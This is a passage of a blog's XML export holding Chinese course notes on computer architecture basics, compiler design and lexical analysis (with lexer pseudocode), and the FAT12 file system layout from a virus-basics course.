<li>有缺陷的系统结构不可能是一种成功的系统结构</li>
<li>可以设计一个没有缺陷的系统结构</li>
</ol>
]]></content>
      <categories>
        <category>系统结构</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>系统结构</tag>
      </tags>
  </entry>
  <entry>
    <title>系统结构第一章_量化设计与分析基础</title>
    <url>/archives/6f1a4250.html</url>
    <content><![CDATA[<h2 id="1-计算机的分类"><a class="markdownIt-Anchor" href="#1-计算机的分类"></a> 1. 计算机的分类</h2>
<h3 id="11-flynns分类"><a class="markdownIt-Anchor" href="#11-flynns分类"></a> 1.1 Flynn’s分类</h3>
<p>定义：基于指令流和数据流数量的计算机结构分类</p>
<ol>
<li>
<p>SISD</p>
<p>串行计算机、确定执行<br />
在任一时钟周期只有单个指令流在CPU执行<br />
在任一时钟周期只有单个数据流用作输入</p>
</li>
<li>
<p>SIMD</p>
<p>数据级并行、适用于处理高度规整操作的问题，如图像处理、同步和确定执行<br />
在任一时钟周期，所有处理单元执行相同的指令<br />
每个处理单元能对不同数据元素进行操作</p>
<span id="more"></span>
</li>
<li>
<p>MISD</p>
<p>少有<br />
单个数据流进入多个处理单元<br />
每个处理单元用单个数据流对数据进行独立操作</p>
</li>
<li>
<p>MIMD</p>
<p>线程级或任务级并行、可同步或异步、可确定或非确定<br />
每个处理器可以执行不同的指令流<br />
每个处理器可以对不同数据流进行操作</p>
</li>
</ol>
<h3 id="12-市场分类"><a class="markdownIt-Anchor" href="#12-市场分类"></a> 1.2 市场分类</h3>
<ol>
<li>个人移动设备</li>
<li>桌面计算机</li>
<li>服务器</li>
<li>集群/仓库级计算机</li>
<li>嵌入式计算机</li>
</ol>
<h2 id="2-系统结构定义和任务"><a class="markdownIt-Anchor" href="#2-系统结构定义和任务"></a> 2. 系统结构定义和任务</h2>
<h3 id="21-定义"><a class="markdownIt-Anchor" href="#21-定义"></a> 2.1 定义</h3>
<p>传统定义：由程序员（机器语言）看见的（计算）系统属性，即概念性结构和功能行为，以区分数据流动和控制逻辑设计的组成及物理实现</p>
<p>现代定义：在满足功能、性能和价格目标的条件下，设计、选择和互连硬件部件构成计算机</p>
<p>区分：</p>
<ol>
<li><strong>经典的计算机系统结构</strong>是机器语言程序员所看到的传统机器级所具有的属性。它确定计算机系统的软、硬件界面。</li>
<li><strong>计算机组成</strong>指的是计算机系统结构的逻辑实现，包括五大功能部件组成以及逻辑设计等。它着眼于机器级内各事件的排序方式与控制方式，各部件的功能以及各部件的联系。</li>
<li><strong>计算机实现</strong>指的是计算机组成的物理实现，包括处理机、主存等部件的物理结构，器件的集成度和速度功耗，模块、插件、底板的划分与连接，信号传输，电源、冷却及整机装配技术等。它着眼于器件技术和微组装技术，其中器件技术在实现技术中占主导作用。</li>
</ol>
<p>例题：</p>
<ol>
<li>主存容量与编址方式(按位、按字节、按字访问等)的确定属于<u>计算机系统结构</u></li>
<li>为达到所定性能价格比，主存速度应多快，在逻辑结构上需采用什么措施(如多体交叉存储等)属于<u>计算机组成</u></li>
<li>主存系统的物理实现，如存储器器件的选定、逻辑电路的设计、微组装技术的选定属于<u>计算机实现</u></li>
</ol>
<p>影响：</p>
<ol>
<li>相同的计算机系统结构的计算机可以有不同的计算机组成</li>
<li>相同的计算机组成可以有不同的计算机实现</li>
</ol>
<p>系列机：</p>
<p>​	是指由一个制造商生产的具有相同的系统结构，但具有不同组成和实现的一系列不同型号的计算机</p>
<p>软件兼容性：</p>
<p>​	同一个软件可以不加修改地运行于系统结构相同的各档机器上，而且运行结果一样，差别只是运行时间不同</p>
<p>向后兼容：</p>
<p>​	在某一时间生产的机器上运行的目标软件能够直接运行于更晚生产的机器上</p>
<p>向上兼容：</p>
<p>​	在低档机器上运行的目标软件能够直接运行于高档机器上</p>
<p>指令集系统结构ISA的7个重要特征：</p>
<ol>
<li>ISA的类型：现代通用寄存器结构、早期累加器结构</li>
<li>存储器访问：字节访问等</li>
<li>寻址方式</li>
<li>操作数类型和大小：8位字符、32位整型数</li>
<li>操作类型：数据传输，算术/逻辑</li>
<li>控制流指令：转移，子程序调用/返回</li>
<li>ISA编码：固定长度，可变长度</li>
</ol>
<h3 id="22-任务"><a class="markdownIt-Anchor" href="#22-任务"></a> 2.2 任务</h3>
<ol>
<li>
<p>考虑</p>
<p>摩尔定律：集成在一个计算机芯片上的元件数量每两年翻一番<br />
经验法则：成本减少速度与密度增加速度成比例<br />
性能趋势：带宽改进优于时延<br />
经验法则：带宽增加速度与时延平方改进速度成比例</p>
</li>
<li>
<p>依据</p>
</li>
<li>
<p>量化原则</p>
</li>
</ol>
<h2 id="3-性能"><a class="markdownIt-Anchor" href="#3-性能"></a> 3. 性能</h2>
<p>SPEC率：一个测试程序在参考计算机上执行时间与被测计算机上执行时间的比值，越大说明被测计算机性能越高</p>
<p>Amdahl定律：采用更快执行方式后所带来的系统性能提高，与这种执行方式的使用频率或占总执行时间的比例有关</p>
<p>改进比例Fe：可改进部分执行时间与改进前整个任务的执行时间的比值</p>
<p>改进加速比Se：改进前改进部分的执行时间与改进后改进部分的执行时间的比值</p>
<p>改进后整个系统的加速比Sn=1/((1-Fe)+Fe/Se)</p>
<p>CPU<sub>time</sub> =指令数量*CPI*时钟周期</p>
]]></content>
      <categories>
        <category>系统结构</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>系统结构</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理第六章</title>
    <url>/archives/e997863b.html</url>
    <content><![CDATA[<h1 id="编译原理第六章-词法分析"><a class="markdownIt-Anchor" href="#编译原理第六章-词法分析"></a> 编译原理第六章-词法分析</h1>
<p>词法分析：编译程序对源程序进行分析和目标程序合成，最终生成目标程序</p>
<p>预处理子程序（预处理器）功能：</p>
<ol>
<li>删除编辑用字符，如制表符、换页符等</li>
<li>删除注释</li>
<li>合并多个空白字符为单个空白字符</li>
<li>组合多个独立文件中的源程序</li>
<li>展开宏定义</li>
<li>条件编译的选择等</li>
</ol>
<span id="more"></span>
<blockquote>
<p>其中，2、3等也可以在词法分析的同时进行</p>
</blockquote>
<h2 id="1-词法分析概述"><a class="markdownIt-Anchor" href="#1-词法分析概述"></a> 1. 词法分析概述</h2>
<p>扫描源程序的字符串，按照词法规则，识别出单词符号作为输出；对识别过程发现的词法错误（非法的字符、不正确的常量、程序括号等）进行处理</p>
<p>词法分析器只执行一次：</p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429084145085.png" alt="image-20210429084145085" /></p>
<p>词法分析器执行多次：</p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429084219353.png" alt="image-20210429084219353" /></p>
<h2 id="2-词法分析器的输出形式"><a class="markdownIt-Anchor" href="#2-词法分析器的输出形式"></a> 2. 词法分析器的输出形式</h2>
<h3 id="21-单词的种类"><a class="markdownIt-Anchor" href="#21-单词的种类"></a> 2.1 单词的种类</h3>
<ol>
<li>标识符：用来命名程序中的实体，如类型、变量、函数、过程、标号等</li>
<li>基本字（关键字）：如if、while等</li>
<li>常量：各种类型的常量</li>
<li>运算符：如+、-、*、/等</li>
<li>（分）界符：如；、{、}等</li>
</ol>
<p>eg：</p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429084743808.png" alt="image-20210429084743808" /></p>
<blockquote>
<p>留意最后的换行符‘\n’也是界符</p>
</blockquote>
<h3 id="22-单词的输出形式"><a class="markdownIt-Anchor" href="#22-单词的输出形式"></a> 2.2 单词的输出形式</h3>
<p>使用二元式表示：</p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429084945101.png" alt="image-20210429084945101" /></p>
<h2 id="3-单词类别的划分"><a class="markdownIt-Anchor" href="#3-单词类别的划分"></a> 3. 单词类别的划分</h2>
<h3 id="31-单词的编码随类别不同而不同"><a class="markdownIt-Anchor" href="#31-单词的编码随类别不同而不同"></a> 3.1 单词的编码随类别不同而不同</h3>
<ol>
<li><strong>基本字、运算符、界符</strong>的数目是确定的，每个单词与它的类别码为一一对应的关系，即<strong>一字一码</strong>，故而它们的第二元可以空缺</li>
<li><strong>标识符</strong>通归一类</li>
<li><strong>常量</strong>可按整型、实型、字符型、布尔型等分类</li>
</ol>
<p>eg：</p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429085538808.png" alt="image-20210429085538808" /></p>
<blockquote>
<p>通常用常数在常量表（标识符在符号表）中的位置（编号）作为它们的属性值</p>
</blockquote>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429085737912.png" alt="image-20210429085737912" /></p>
<h3 id="32-单词的识别方法"><a class="markdownIt-Anchor" href="#32-单词的识别方法"></a> 3.2 单词的识别方法</h3>
<ol>
<li>
<p>标识符和关键字的识别</p>
<blockquote>
<p>需要<strong>超前搜索</strong>（多读一个字符以确认上一个结束）</p>
<p>读到 非 字母数字停止</p>
</blockquote>
</li>
<li>
<p>常数的识别</p>
<blockquote>
<p>部分常量需要超前搜索</p>
</blockquote>
</li>
<li>
<p>运算符的识别</p>
<blockquote>
<p>1个或多个符号构成</p>
<p>需要超前搜索</p>
</blockquote>
</li>
<li>
<p>界符的识别</p>
<blockquote>
<p>不需要超前搜索</p>
</blockquote>
</li>
</ol>
<h2 id="4-状态转换图"><a class="markdownIt-Anchor" href="#4-状态转换图"></a> 4. 状态转换图</h2>
<p>状态转换图是设计词法分析器的有效工具</p>
<p>状态图特点：</p>
<ol>
<li>有限的有向图</li>
<li>有向边上标记字符</li>
<li>唯一初态</li>
<li>若干终态（至少一个）</li>
</ol>
<p>图示：</p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429090825221.png" alt="image-20210429090825221" /></p>
<p>eg：</p>
<p>识别标识符和数字串的状态转换图：</p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429091210263.png" alt="image-20210429091210263" /></p>
<p>它的流程图：</p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429091340527.png" alt="image-20210429091340527" /></p>
<h2 id="5-词法分析器的设计"><a class="markdownIt-Anchor" href="#5-词法分析器的设计"></a> 5. 词法分析器的设计</h2>
<h3 id="51-单词符号"><a class="markdownIt-Anchor" href="#51-单词符号"></a> 5.1 单词符号</h3>
<p>标识符：begin、end、integer、if、then、else、function、read、write</p>
<p>无符号整型常量</p>
<p>运算符：-、*、&lt;、&lt;=、&lt;&gt;、=、&gt;、&gt;=、:=</p>
<p>分界符：；、（、）、</p>
<h3 id="52-状态转换图"><a class="markdownIt-Anchor" href="#52-状态转换图"></a> 5.2 状态转换图</h3>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429091724175.png" alt="image-20210429091724175" /></p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429091752010.png" alt="image-20210429091752010" /></p>
<blockquote>
<p>注意：有*标记的状态需要回退一个字符</p>
</blockquote>
<h3 id="53-一个示意算法"><a class="markdownIt-Anchor" href="#53-一个示意算法"></a> 5.3 一个示意算法</h3>
<p>以下是将会用到的变量、函数和过程</p>
<ol>
<li>
<p>cha</p>
<blockquote>
<p>字符变量，存放最新读入的字符</p>
</blockquote>
</li>
<li>
<p>token</p>
<blockquote>
<p>字符数组，存放已读入的字符序列</p>
</blockquote>
</li>
<li>
<p>getchar（）</p>
<blockquote>
<p>读入字符的过程，从输入字符串（源程序文件）中读入一个字符到变量cha中</p>
</blockquote>
</li>
<li>
<p>getnbc（）</p>
<blockquote>
<p>读入非空白字符的函数</p>
</blockquote>
</li>
<li>
<p>concat（）</p>
<blockquote>
<p>连接字符的过程，把cha中的字符连接到token数组的末尾</p>
</blockquote>
</li>
<li>
<p>letter（）</p>
<blockquote>
<p>判断字符是否为字母的函数，若cha中的字符是字母，返回true，否则返回false</p>
</blockquote>
</li>
<li>
<p>digit（）</p>
<blockquote>
<p>判断字符是否为数字的函数，同上</p>
</blockquote>
</li>
<li>
<p>retract（）</p>
<blockquote>
<p>回退字符的过程，将刚读入cha中的字符回退到输入字符串中，并将cha的值置为空白</p>
<p>实现方法：不需要真正回退，可以设置标记位。</p>
</blockquote>
</li>
<li>
<p>reserve（）</p>
<blockquote>
<p>处理保留字的函数，对存放在token中的字符串差保留字表，查到返回该保留字的类别编码，否则返回0（假定0不是任何单词符号的类别编码）</p>
</blockquote>
</li>
<li>
<p>bulidlist（）</p>
<blockquote>
<p>对token中的字符串查符号表，查到返回位置编号，否则将该串存入符号表，并返回它在符号表中的位置编号</p>
</blockquote>
</li>
<li>
<p>dtb（）</p>
<blockquote>
<p>将token中的数字串（字符串）转换成二进制，存入常数表中，并返回它在符号表中的位置编号。若已经存在，则直接返回它在表中的编号</p>
</blockquote>
</li>
<li>
<p>return（num，value）</p>
<blockquote>
<p>返回二元式函数，num为单词类别编码，value是单词在符号表中的位置编号，或是它在常数表中的位置编号，或是0</p>
</blockquote>
</li>
<li>
<p>error（）</p>
<blockquote>
<p>处理出现词法错误的过程。有一类词法错误可以在词法分析时发现，如出现字母表以外的非法字符。不和规则的常数等。但有一类词法错误例如if写成fi，词法分析会将fi当标识符处理，length中多了个空格，词法分析会将le和ngth当作两个标识符处理，这类错误要推迟到语法分析时才能发现，当作语法错误处理</p>
</blockquote>
</li>
</ol>
<p>伪代码：</p>
<figure class="highlight pascal"><table><tr><td class="code"><pre><span class="line">Word_Struct LexAnalyze()</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">   start:  token:=‘’ ;</span><br><span class="line">              getchar();</span><br><span class="line">              getnb();</span><br><span class="line">              <span class="keyword">case</span> cha <span class="keyword">of</span> </span><br><span class="line">                ‘a’…‘z’:  <span class="keyword">begin</span> </span><br><span class="line">                  <span class="keyword">while</span> letter() <span class="keyword">or</span> digit() <span class="keyword">do</span></span><br><span class="line">                     <span class="keyword">begin</span> concat ();getchar() <span class="keyword">end</span>;</span><br><span class="line">                     retract(); c:= reserve();</span><br><span class="line">                     <span class="keyword">if</span> c = <span class="number">0</span> <span class="keyword">then</span> <span class="keyword">begin</span></span><br><span class="line">                        val:= buildlist(); return($ID,val)    end</span><br><span class="line">                    <span class="keyword">else</span> return(c,<span class="number">0</span>)</span><br><span class="line">                 <span class="keyword">end</span>;</span><br><span class="line">                ‘<span class="number">0</span>’…‘<span class="number">9</span>’:  <span class="keyword">begin</span></span><br><span class="line">                 <span class="keyword">while</span> digit() <span class="keyword">do</span></span><br><span class="line">                   <span class="keyword">begin</span> concat();getchar() <span class="keyword">end</span>;</span><br><span class="line">                 retract(); val:=dtb();</span><br><span class="line">                 return($INT,val)</span><br><span class="line">                 <span class="keyword">end</span>;</span><br><span class="line">                ‘ = ’:   return(<span class="number">$E</span>Q,<span class="number">0</span>);</span><br><span class="line">                ‘ - ’:    return($SUB,0); </span><br><span class="line">                ‘ * ’:   return($MUL,0);</span><br><span class="line">                ‘ ( ’:    return($LPAR,0);</span><br><span class="line">                ‘ ) ’:    return($RPAR,0);</span><br><span class="line">                ‘ ; ’:    return($SEM,0)</span><br><span class="line">                ‘ &lt; ’:   <span class="keyword">begin</span></span><br><span class="line">                  getchar();</span><br><span class="line">                  if cha = ‘=’ then return($LE, 0)</span><br><span class="line">                  <span class="keyword">else</span> </span><br><span class="line">                    if cha = ‘&gt;’ then return($NE, 0);</span><br><span class="line">                  retract();  return($LT,0)</span><br><span class="line">                <span class="keyword">end</span>;</span><br><span class="line">                ‘ &gt; ’:   <span class="keyword">begin</span></span><br><span class="line">                  getchar();</span><br><span class="line">                  if cha= ‘ = ’ then return($GE, 0);</span><br><span class="line">                  retract();</span><br><span class="line">                  return($GT, 0)</span><br><span class="line">                <span class="keyword">end</span>;</span><br><span class="line">                ‘ : ’:    <span class="keyword">begin</span></span><br><span class="line">                  getchar();</span><br><span class="line">                  <span class="keyword">if</span> cha = ‘ = ‘ <span class="keyword">then</span>   </span><br><span class="line">                      return(<span class="number">$A</span>SSIGN,<span class="number">0</span>)</span><br><span class="line">                  <span class="keyword">else</span> error(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">end</span>;</span><br><span class="line">                other: error(<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">end</span> <span class="keyword">of</span> <span class="keyword">case</span>;</span><br><span class="line"><span class="keyword">End</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>以上代码将词法分析器实现为一个函数LexAnalyze()，函数没执行一次，就会从输入字符串中识别出一个单词符号并按二元式形式返回。</p>
</blockquote>
]]></content>
      <categories>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理第五章</title>
    <url>/archives/8c99cde2.html</url>
    <content><![CDATA[<h3 id="编译概述"><a class="markdownIt-Anchor" href="#编译概述"></a> 编译概述</h3>
<h4 id="1-不同语言程序之间的翻译"><a class="markdownIt-Anchor" href="#1-不同语言程序之间的翻译"></a> 1. 不同语言程序之间的翻译</h4>
<h5 id="11-翻译"><a class="markdownIt-Anchor" href="#11-翻译"></a> 1.1 翻译</h5>
<p>定义：语法单位之间等价的变换<br />
就是将一种语言编写的程序转换成等价的另一种语言编写的程序</p>
<h5 id="12-特殊的翻译汇编-编译"><a class="markdownIt-Anchor" href="#12-特殊的翻译汇编-编译"></a> 1.2 特殊的翻译：汇编、编译</h5>
<p>汇编：将汇编语言程序翻译为机器语言的程序<br />
编译：将高级语言程序翻译为低级语言的程序</p>
<span id="more"></span>
<h5 id="13-翻译程序"><a class="markdownIt-Anchor" href="#13-翻译程序"></a> 1.3 翻译程序</h5>
<p>定义：完成翻译工作的程序，也叫翻译器</p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20210426201154954.png" alt="image-20210426201154954" /></p>
<p>宿主语言：翻译程序对应的语言<br />
宿主机：运行翻译程序的机器</p>
<h5 id="14-编译程序"><a class="markdownIt-Anchor" href="#14-编译程序"></a> 1.4 编译程序</h5>
<p>定义：实现编译的翻译程序，也叫编译器</p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20210426201419434.png" alt="image-20210426201419434" /></p>
<p>自驻留的编译程序：编译程序生成宿主机执行的机器代码<br />
自编译的编译程序：编译程序是用源语言写的<br />
交叉编译：编译程序生成的不是宿主机执行的机器代码</p>
<h4 id="2-编译的步骤"><a class="markdownIt-Anchor" href="#2-编译的步骤"></a> 2. 编译的步骤</h4>
<p>逻辑上分为两部分：</p>
<ol>
<li>源程序的分析</li>
<li>目标程序的合成</li>
</ol>
<p>具体为5个步骤：</p>
<ol>
<li>词法分析</li>
<li>语法分析</li>
<li>语义分析与中间代码生成</li>
<li>中间代码优化</li>
<li>目标代码生成</li>
</ol>
<p><strong>编译的每个步骤都需要：</strong></p>
<ol>
<li>符号表管理</li>
<li>出错处理</li>
</ol>
<h5 id="21-词法分析"><a class="markdownIt-Anchor" href="#21-词法分析"></a> 2.1 词法分析</h5>
<p>分析输入的字符串，根据词法规则识别出单词符号<br />
单词符号：基本字、标识符、字面常量、运算符、界符</p>
<h5 id="22-语法规则"><a class="markdownIt-Anchor" href="#22-语法规则"></a> 2.2 语法规则</h5>
<p>根据语法规则，识别各类语法单位并进行语法检查<br />
语法单位：表达式、语句、程序单元、程序</p>
<h5 id="23-语义分析与中间代码生成"><a class="markdownIt-Anchor" href="#23-语义分析与中间代码生成"></a> 2.3 语义分析与中间代码生成</h5>
<p>根据语义规则，对语法正确的语法单位进行翻译<br />
注：可以直接生成目标程序，但目标程序执行效率低，故而生成中间代码</p>
<p>中间代码：大多数的编译器采用中间代码来描述源程序的语义，这种中间语言对应某种抽象机，结构简单，语义明确，易于翻译成目标代码，同时也便于优化和移植。</p>
<h5 id="24-优化"><a class="markdownIt-Anchor" href="#24-优化"></a> 2.4 优化</h5>
<p>对中间代码进行等价变换，提高代码的时空效率<br />
注：语义分析产生的中间代码不依赖于实际的机器，故而易于做一些等价变换，使生成的目标程序占用空间更少，执行更快。</p>
<h5 id="25-目标代码生成"><a class="markdownIt-Anchor" href="#25-目标代码生成"></a> 2.5 目标代码生成</h5>
<p>根据优化后的中间代码以及有关信息，可生成较为有效的目标代码<br />
目标代码：目标机的机器语言程序或汇编语言程序<br />
注：若生成的是汇编语言程序，还需将其汇编成机器语言程序</p>
<h5 id="26-符号表管理"><a class="markdownIt-Anchor" href="#26-符号表管理"></a> 2.6 符号表管理</h5>
<p>描述符表：存放实体属性的表格<br />
注：根据实体的不同，表格的形式也不同，其中最主要的是<strong>符号表</strong><br />
注：编译程序应有一组表格管理程序，负责表格的建立、维护、引用、查找、更新</p>
<h5 id="27-出错处理"><a class="markdownIt-Anchor" href="#27-出错处理"></a> 2.7 出错处理</h5>
<p>编译程序发现错误后进行出错处理，包括报告错误的性质和发生错误的位置等</p>
<h5 id="28-编译器的结构"><a class="markdownIt-Anchor" href="#28-编译器的结构"></a> 2.8 编译器的结构</h5>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20210426210832819.png" alt="image-20210426210832819" /></p>
<h4 id="3-完整的程序处理过程"><a class="markdownIt-Anchor" href="#3-完整的程序处理过程"></a> 3. 完整的程序处理过程</h4>
<p>从分析源程序到建立一个可执行的目标程序，处理过程还需要<strong>预处理器、汇编器、连接器、装入器</strong></p>
<h5 id="31-完整的程序处理过程"><a class="markdownIt-Anchor" href="#31-完整的程序处理过程"></a> 3.1 完整的程序处理过程</h5>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20210426211128343.png" alt="image-20210426211128343" /></p>
<h4 id="4-编译前端与后端"><a class="markdownIt-Anchor" href="#4-编译前端与后端"></a> 4. 编译前端与后端</h4>
<p>现代编译器通常将编译过程划分为前端和后端分别实现，它们通过中间代码连接，可极大提高编译器设计与实现的效率</p>
<h5 id="41-前端"><a class="markdownIt-Anchor" href="#41-前端"></a> 4.1 前端</h5>
<p>主要是与源程序相关的部分，包括词法、语法分析、语义分析、中间代码生成等</p>
<h5 id="42-后端"><a class="markdownIt-Anchor" href="#42-后端"></a> 4.2 后端</h5>
<p>主要是与目标程序相关的部分，包括优化、目标代码生成等</p>
<h4 id="5-结语"><a class="markdownIt-Anchor" href="#5-结语"></a> 5. 结语</h4>
<p>词法分析基于有限状态自动机FA<br />
语法分析基于下推自动机PDA</p>
]]></content>
      <categories>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>病毒-基础-文件系统</title>
    <url>/archives/c3d31f32.html</url>
    <content><![CDATA[<h4 id="初识文件系统"><a class="markdownIt-Anchor" href="#初识文件系统"></a> 初识文件系统</h4>
<p>文件系统就是组织文件的一种方式<br />
文件管理包括文件生成、删除、目录查询等<br />
eg：</p>
<ol>
<li>Windows文件系统：FAT12、FAT16、FAT32、NTFS</li>
<li>Linux文件系统：EXT2</li>
</ol>
<span id="more"></span>
<h4 id="fat12文件系统的磁盘格式"><a class="markdownIt-Anchor" href="#fat12文件系统的磁盘格式"></a> FAT12文件系统的磁盘格式</h4>
<ol>
<li>引导扇区（DBR）：记录各种参数，比如扇区大小，一簇的扇区数</li>
<li>文件分配表（FAT）：记录已分配的扇区和可用扇区</li>
<li>文件目录表（DIR）：记录根目录文件项的表，文件项包括文件，目录。</li>
<li>用户数据：存放数据的区域</li>
</ol>
<p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/image-20210425164158141.png" alt="image-20210425164158141" /></p>
<p>注：左侧为扇区号、第二个FAT12为备用FAT</p>
<h4 id="如何定位到一个文件"><a class="markdownIt-Anchor" href="#如何定位到一个文件"></a> 如何定位到一个文件</h4>
<h5 id="fat表的格式"><a class="markdownIt-Anchor" href="#fat表的格式"></a> FAT表的格式</h5>
<p>在文件系统中，文件分配的最小单位是簇，哪怕只有一个字节也会分配一簇<br />
簇是由n个扇区组成<br />
其中n在引导扇区的引导记录中定义</p>
<p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/image-20210428094415697.png" alt="image-20210428094415697" /></p>
<h5 id="fat表的本质"><a class="markdownIt-Anchor" href="#fat表的本质"></a> FAT表的本质</h5>
<p>FAT表的本质是<strong>磁盘簇分配情况的数据表示</strong></p>
<p>在FAT12文件系统中，FAT表以3个<strong>半字节</strong>（3*0.5Byte=1.5Byte=12bit）来记录一个簇的相关情况，这也是FAT12中12的由来</p>
<p>FAT表中每3个<strong>半字节</strong>为一个元素，这个元素就代表一个簇，簇号从0开始，这个元素中<strong>存放的整数值</strong>表示其链接的下一簇的簇号</p>
<h5 id="fat表的查找与遍历机制"><a class="markdownIt-Anchor" href="#fat表的查找与遍历机制"></a> FAT表的查找与遍历机制</h5>
<p>FAT表是一个数组，数组中每个元素是1.5字节的整数，为了查找FAT表中簇号为N的元素，只需用N作索引查找FAT[N]元素，如下图：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/image-20210428095326854.png" alt="image-20210428095326854" /></p>
<p>真正在FAT12表中的查找方法：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/image-20210428095655541.png" alt="image-20210428095655541" /></p>
<p>注意：三个字节中如何分配的两个半字节，可以结合<strong>小端机</strong>中数据的存放规则记忆</p>
<h5 id="遍历一个文件占用的簇"><a class="markdownIt-Anchor" href="#遍历一个文件占用的簇"></a> 遍历一个文件占用的簇</h5>
<p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/image-20210428100002898.png" alt="image-20210428100002898" /></p>
<h5 id="如何获取首簇号"><a class="markdownIt-Anchor" href="#如何获取首簇号"></a> 如何获取首簇号</h5>
<p>根目录区有根目录表，其记录了文件的各种信息。<br />
根目录表中包含多条记录，每条记录占32个字节</p>
<p>现在我们关注根目录表中的<strong>文件名</strong>字段和<strong>首簇号</strong>字段<br />
文件名</p>
<blockquote>
<p>在记录首部偏移0开始，共<strong>11字节</strong>，前8个字节记录文件名，后3个字节记录扩展名（中间的.不需要记录）名字的结束以空格表示（即0x20）</p>
</blockquote>
<p>首簇号</p>
<blockquote>
<p>首簇号首部偏移0x1A开始，共2个字节</p>
</blockquote>
<p>下图是getexe.com的文件名与首簇号图示，getexe只占用6个字节，后两个字节用空格填充，首簇号是0003</p>
<p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/image-20210428160041729.png" alt="image-20210428160041729" /></p>
<h5 id="如何查找根目录"><a class="markdownIt-Anchor" href="#如何查找根目录"></a> 如何查找根目录</h5>
<ol>
<li>从磁盘0头0道1扇区读出引导区（Boot）512字节，从其中引导记录获取相关信息：Boot区占用扇区数，FAT表数目，每个FAT表的扇区数，1个扇区的字节数</li>
<li>计算根目录区的起始位置为：<br />
[ 1（Boot区扇区数）+2（FAT数目）*9（FAT扇区数）] * 512 = 0x2600<br />
即2600h为根目录区起始位置</li>
<li>从引导记录获取根区记录数，缺省224条，按每条记录32字节读出所有记录</li>
<li>每条记录开始11个字节为文件名，比较文件名匹配则找到记录，从首簇字段（从该记录开始偏移1Ah处）获得首簇号</li>
</ol>
<h5 id="多级目录的查找流程"><a class="markdownIt-Anchor" href="#多级目录的查找流程"></a> 多级目录的查找流程</h5>
<p>以查找a:\tem\tem.txt为例</p>
<p>大致思想：</p>
<blockquote>
<p>在根目录区下的tem项，会给出tem项的首簇号，系统就可以通过FAT表在数据区找到tem对应的信息（即tem目录表），在这个tem目录表下，再通过该目录表的项（每项32字节），继续查找tem下的文件或更下层的目录，如此，即可形成多层次的目录嵌套</p>
</blockquote>
<p>详细流程：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/image-20210428161152854.png" alt="image-20210428161152854" /></p>
<h5 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h5>
<ol>
<li>根据文件路径第一项先查看根目录表，是否有匹配的项，如果有，通过对应项的首簇段获取该子目录表的首簇号</li>
